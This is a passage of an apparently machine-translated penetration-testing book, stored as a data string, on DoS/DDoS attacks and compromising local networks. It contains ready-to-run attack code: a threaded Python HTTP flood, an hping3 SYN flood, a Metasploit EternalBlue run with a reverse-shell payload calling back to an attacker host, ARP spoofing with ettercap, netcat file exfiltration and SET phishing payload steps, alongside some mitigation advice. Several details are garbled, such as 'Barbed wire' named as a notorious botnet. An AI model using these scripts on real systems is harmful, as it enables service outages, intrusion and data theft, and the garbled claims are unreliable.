- fmt: "\n# Creation and Use of Botnets\nAttackers often use malware to compromise\
    \ devices, turning them into bots that can be activated to send traffic to the\
    \ target. Examples of notorious botnets include `Mirai` and `Barbed wire`.\n\n\
    ## Attack and Mitigation Scripts\nAutomating attacks and mitigation strategies\
    \ is crucial to fully understanding the impact of DoS/DDoS attacks and developing\
    \ effective defenses.\n\n### Attack Scripts with Python\nA Python script can be\
    \ used to automate a simple DoS attack using the HTTP protocol, simulating a large\
    \ volume of requests to a web server.\n\n```python\nimport requests\nimport threading\n\
    \ntarget_url = \"http://target.com\"\nnum_requests = 1000\n\ndef send_request():\n\
    \    try:\n        while True:\n            response = requests.get(target_url)\n\
    \            print(f\"Request sent with status: {response.status_code}\")\n  \
    \  except requests.exceptions.RequestException as e:\n        print(f\"Error:\
    \ {e}\")\n\nthreads = []\nfor i in range(num_requests):\n    thread = threading.Thread(target=send_request)\n\
    \    threads.append(thread)\n    thread.start()\n```\nThis script sends HTTP requests\
    \ to the target continuously, simulating a DoS attack. The use of threads allows\
    \ multiple requests to be sent simultaneously, overloading the server.\n\n###\
    \ Automation with Bash\nA Bash script can be used to automate a SYN Flood attack,\
    \ using the tool `Hping3`.\n\n```bash\n#!/bin/bash\ntarget_ip=\"192.168.1.1\"\n\
    port=\"80\"\ninterval=\"0\"\nhping3 -S --flood -V -p $port $target_ip --interval\
    \ $interval\n```\nThis script launches a SYN Flood attack against the target's\
    \ port 80, sending packets in a continuous stream with no gap, maximizing the\
    \ load on the server.\n\n## DoS/DDoS Attack Mitigation\nMitigating DoS/DDoS attacks\
    \ requires a combination of technical and tactical measures to detect, block,\
    \ and respond to malicious traffic.\n\n- **Firewalls and IDS/IPS**: Configuring\
    \ firewalls and intrusion detection/prevention systems (`IDS/IPS`) to identify\
    \ and block malicious traffic is one of the first lines of defense. Specific rules\
    \ can be implemented to detect traffic patterns associated with DoS/DDoS attacks.\n\
    - **Rate Limiting**: Implement `Rate Limiting` in servers and web applications\
    \ limits the number of requests that a client can make in a period of time, reducing\
    \ the impact of attacks based on large requests.\n- **Blackholing and Sinkholing**:\
    \ When a DDoS attack is detected, a common response is to redirect traffic to\
    \ a \"blackholing\" or sinkhole server that absorbs the malicious traffic without\
    \ affecting the core infrastructure.\n\n### Real-Time Monitoring and Response\n\
    Real-time monitoring tools such as `Nagios` and `Zabbix`, can be configured to\
    \ alert administrators to suspicious spikes in traffic, enabling rapid response\
    \ to attacks.\n\n- **Traffic Monitoring**: Configuring monitoring to observe traffic\
    \ patterns is essential for detecting ongoing DoS/DDoS attacks. Tools like `Wireshark`\
    \ and `tcpdump` can capture packets for detailed analysis.\n\n```bash\ntcpdump\
    \ -i eth0 'tcp and src port 80'\n```\nThis command captures TCP traffic from port\
    \ 80, allowing you to analyze traffic that may be overloading the server.\n\n\
    ### DDoS Protection Services\nCompanies can use DDoS mitigation services, such\
    \ as `Cloudflare` or `Smart`, which provide specialized protection against volumetric\
    \ attacks by absorbing traffic before it reaches core infrastructure.\n\nDenial\
    \ of Service attacks, both DoS and DDoS, pose a significant threat to the stability\
    \ and availability of online services. Understanding the techniques and tools\
    \ used in these attacks is crucial to proactively and effectively defending critical\
    \ systems. Automating these attacks and implementing mitigation strategies allows\
    \ security professionals to test the resilience of their networks and services,\
    \ ensuring they are prepared to deal with real threats. Balancing the ability\
    \ to simulate devastating attacks and implementing robust defenses is critical\
    \ to maintaining the integrity and availability of digital infrastructures.\n\n\
    # Chapter 11: Penetration Testing on Local Area Networks\n\nThe security of local\
    \ networks, although often perceived as robust due to their relative isolation,\
    \ can be compromised by attackers exploiting internal vulnerabilities. Penetration\
    \ testing on local networks is an essential practice to identify and mitigate\
    \ these vulnerabilities, ensuring that the network is protected against internal\
    \ and external threats. Mapping the network, identifying vulnerable targets, compromising\
    \ devices, and automating these tasks are key elements of effective penetration\
    \ testing.\n\n## Map and Compromise Internal Networks\nMapping a local network\
    \ involves identifying all connected devices, along with their operating systems,\
    \ active services, and open ports. This mapping provides a detailed view of the\
    \ available attack surface, allowing the pentester to plan and execute specific\
    \ actions to compromise network security.\n\n### Network Scanning and Mapping\n\
    Mapping starts with scanning the network to discover all active devices. Tools\
    \ like `Nmap` play a crucial role in this process, allowing the identification\
    \ of devices, operating systems and running services.\n\nDevice Discovery Scan:\n\
    ```bash\nnmap -sn 192.168.1.0/24\n```\n- The above command performs a quick scan\
    \ to list all active devices on the specified network. This step is essential\
    \ for establishing an inventory of connected assets.\n\nDetection of Services\
    \ and Operating Systems:\n```bash\nnmap -O -sV 192.168.1.0/24\n```\n- Here, `Nmap`\
    \ identifies the operating systems running and services active on each device,\
    \ providing a detailed view of potential targets and their associated vulnerabilities.\n\
    \n### Compromising Internal Networks\nAfter mapping the network, the next step\
    \ is to compromise specific devices that have vulnerabilities. Compromise can\
    \ be carried out by exploiting vulnerable services, carrying out security attacks\
    \ Man-in-the-Middle (`MitM`) or exfiltrating data.\n\n#### Exploitation of Vulnerable\
    \ Services\nOutdated or misconfigured services on local networks represent a significant\
    \ entry point for attackers. THE `Metasploit Framework` offers a range of exploits\
    \ that can be used to compromise these services.\n\nSMB Exploitation:\n```bash\n\
    use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD\
    \ windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.200\nrun\n```\n- The\
    \ above command exploits the vulnerability `EternalBlue` over the `SMB` protocol,\
    \ allowing the attacker to gain access to the target system.\n\n#### Attacks Man-in-the-Middle\
    \ (MitM)\nBy compromising a device on the network, the attacker can position themselves\
    \ between other devices' communication and the gateway, intercepting and potentially\
    \ altering the traffic. `Ettercap` is a common tool for carrying out these attacks.\n\
    \nSpoofing de ARP:\n```bash\nettercap -T -M arp:remote /192.168.1.101// /192.168.1.1//\n\
    ```\n- This attack redirects traffic between a device and the network gateway\
    \ to the attacker, who can monitor or modify the transmitted data.\n\n#### Data\
    \ Exfiltration\nAfter compromising a device, exfiltrating sensitive data is often\
    \ the end goal. `Netcat` can be used to transfer this data to a server controlled\
    \ by the attacker.\n\nFile Transfer with Netcat:\n```bash\nnc -lvp 4444 > exfiltrated_data.zip\n\
    ```\nThe above command puts `Netcat` into listening mode to receive a file, while\
    \ the compromised device sends the data with:\n```bash\nnc target_ip 4444 < sensitive_data.zip\n\
    ```\n\n## Tools and Techniques for Compromising Local Networks\nCompromising local\
    \ networks requires a combination of techniques that exploit vulnerabilities in\
    \ connected devices and network infrastructure.\n\n### Internal Social Engineering\n\
    On local networks, social engineering is a powerful technique, especially when\
    \ combined with internal phishing. THE `Social-Engineer Toolkit (`SET)` allows\
    \ the creation of targeted phishing campaigns.\n\nPhishing com SET:\n```bash\n\
    setoolkit\nSocial-Engineering Attacks > Spear-Phishing Attack Vectors > Create\
    \ a FileFormat Payload\n```\n- `SET` facilitates the creation of phishing emails\
    \ with malicious attachments, which can be sent to internal targets, exploiting\
    \ trust between users on the same network.\n"
